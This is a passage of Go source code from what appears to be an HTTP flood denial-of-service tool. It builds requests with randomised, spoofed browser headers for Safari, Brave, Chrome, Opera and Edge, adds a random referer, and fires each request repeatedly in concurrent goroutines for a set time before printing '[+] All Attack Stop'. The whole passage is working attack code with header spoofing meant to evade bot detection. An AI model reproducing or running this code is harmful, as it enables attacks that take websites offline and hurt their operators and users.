								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							case "Safari":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(16-14+1) + 14
								secFetchUser := "?0"
								if rand.Float32() >= 0.5 {
									secFetchUser = "?1"
								}
								acceptEncoding := "gzip, deflate, br, zstd"
								if rand.Float32() >= 0.5 {
									acceptEncoding = "gzip, deflate, br"
								}
								secFetchDest := "document"
								if rand.Float32() >= 0.5 {
									secFetchDest = "empty"
								}
								secFetchMode := "navigate"
								if rand.Float32() >= 0.5 {
									secFetchMode = "cors"
								}
								secFetchSite := "none"
								if rand.Float32() >= 0.5 {
									secFetchSite = "same-site"
								}
								accept := "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								if rand.Float32() >= 0.5 {
									accept = "application/json"
								}
								priority := "u=0, i"
								if rand.Float32() >= 0.5 {
									priority = "u=1, i"
								}
								platform := "macOS"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Safari";v="%d", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_%d_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%d.0 Safari/605.1.15`, version, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							case "Brave":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(124-115+1) + 115
								secFetchUser := "?0"
								if rand.Float32() >= 0.5 {
									secFetchUser = "?1"
								}
								acceptEncoding := "gzip, deflate, br, zstd"
								if rand.Float32() >= 0.5 {
									acceptEncoding = "gzip, deflate, br"
								}
								secFetchDest := "document"
								if rand.Float32() >= 0.5 {
									secFetchDest = "empty"
								}
								secFetchMode := "navigate"
								if rand.Float32() >= 0.5 {
									secFetchMode = "cors"
								}
								secFetchSite := "none"
								if rand.Float32() >= 0.5 {
									secFetchSite = "same-site"
								}
								accept := "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								if rand.Float32() >= 0.5 {
									accept = "application/json"
								}
								priority := "u=0, i"
								if rand.Float32() >= 0.5 {
									priority = "u=1, i"
								}
								platform := "Windows"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="%d", "Google Chrome";v="%d", "Not-A.Brand";v="99"`, version, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36`, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							case "Google Chrome":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(124-115+1) + 115
								if rand.Float32() < 0.5 {
									secFetchUser = "?0"
								} else {
									secFetchUser = "?1"
								}
								if rand.Float32() < 0.5 {
									acceptEncoding = "gzip, deflate, br, zstd"
								} else {
									acceptEncoding = "gzip, deflate, br"
								}
								if rand.Float32() < 0.5 {
									secFetchDest = "document"
								} else {
									secFetchDest = "empty"
								}
								if rand.Float32() < 0.5 {
									secFetchMode = "navigate"
								} else {
									secFetchMode = "cors"
								}
								if rand.Float32() < 0.5 {
									secFetchSite = "none"
								} else {
									secFetchSite = "same-site"
								}
								if rand.Float32() < 0.5 {
									accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								} else {
									accept = "application/json"
								}
								if rand.Float32() < 0.5 {
									priority = "u=0, i"
								} else {
									priority = "u=1, i"
								}
								platform := "Windows"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="%d", "Google Chrome";v="%d", "Not-A.Brand";v="99"`, version, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36`, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							case "Opera":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(90-70+1) + 70
								if rand.Float32() < 0.5 {
									secFetchUser = "?0"
								} else {
									secFetchUser = "?1"
								}
								if rand.Float32() < 0.5 {
									acceptEncoding = "gzip, deflate, br, zstd"
								} else {
									acceptEncoding = "gzip, deflate, br"
								}
								if rand.Float32() < 0.5 {
									secFetchDest = "document"
								} else {
									secFetchDest = "empty"
								}
								if rand.Float32() < 0.5 {
									secFetchMode = "navigate"
								} else {
									secFetchMode = "cors"
								}
								if rand.Float32() < 0.5 {
									secFetchSite = "none"
								} else {
									secFetchSite = "same-site"
								}
								if rand.Float32() < 0.5 {
									accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								} else {
									accept = "application/json"
								}
								if rand.Float32() < 0.5 {
									priority = "u=0, i"
								} else {
									priority = "u=1, i"
								}
								platform := "Windows"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="%d", "Opera";v="%d", "Not-A.Brand";v="99"`, version, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36`, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							case "Edge":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(124-113+1) + 113
								secFetchUser := "?0"
								if rand.Float32() >= 0.5 {
									secFetchUser = "?1"
								}
								acceptEncoding := "gzip, deflate, br, zstd"
								if rand.Float32() >= 0.5 {
									acceptEncoding = "gzip, deflate, br"
								}
								secFetchDest := "document"
								if rand.Float32() >= 0.5 {
									secFetchDest = "empty"
								}
								secFetchMode := "navigate"
								if rand.Float32() >= 0.5 {
									secFetchMode = "cors"
								}
								secFetchSite := "none"
								if rand.Float32() >= 0.5 {
									secFetchSite = "same-site"
								}
								accept := "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								if rand.Float32() >= 0.5 {
									accept = "application/json"
								}
								priority := "u=0, i"
								if rand.Float32() >= 0.5 {
									priority = "u=1, i"
								}
								platform := "Windows"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="%d", "Microsoft Edge";v="%d", "Not-A.Brand";v="99"`, version, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36`, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
								req.Header.Set("accept-encoding", acceptEncoding)
								req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
								req.Header.Set("priority", priority)
							}
							req.Header.Set("referer", refers[rand.Intn(len(refers))])
							for i := 0; i < aiRate; i++ {
								go client.Do(req)
							}
						}
					}
					defer resh.Body.Close()
				}()
				time.Sleep(1 * time.Millisecond)
			}
		}()
	}
	time.Sleep(time.Duration(t) * time.Second)
	fmt.Println("[+] All Attack Stop")
	os.Exit(0)
}
